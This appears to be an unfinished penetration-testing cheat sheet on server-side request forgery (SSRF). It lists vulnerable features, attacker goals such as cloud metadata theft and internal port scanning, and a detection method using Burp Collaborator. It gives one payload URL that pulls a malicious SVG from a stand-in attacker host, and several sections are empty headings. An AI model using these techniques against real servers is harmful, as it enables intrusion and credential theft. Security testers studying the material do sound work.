# Server-Side Request Forgery

## Where to find?

- Callbacks
- Upload image/file by URL
- URL preview
- File processing:
  - HTML/PDF/image Rendering
  - SVG
  - XXE: xml, docx, odt
  - ffmpeg AVI/M3U8
- Reverse Proxy, Load Balancer
- Brute GET/POST typical SSRF params

## What can we do?

- File read 
- Make internal server perform actions
- Scan internal network and ports
- Fetch META-DATA if server runs on Cloud instances
- SSRF to Reflected XSS

## How to find?

- Find anything that accepts a URL or File upload or File processing
- Crawl the whole web app with Burp turned on and search for parameter name like: ```?url=```, ```?uri=```. ```?req=```,...
- Repacle the URL paramter with abcxyz.burpcollaborator.net -> receive a HTTP request in collaborator -> vulnerable to SSRF

## 1. Basic (display response)

### SSRF to Reflected XSS

Fetch a file from external sites which has malicious payload:

```http://victim.com/?url=http://attacker.com/xss.svg```

### Testing URL schemes:

### Scan internal network and ports 

### Fetch META-DATA if server runs on Cloud instances

## 2. Blind (no response)
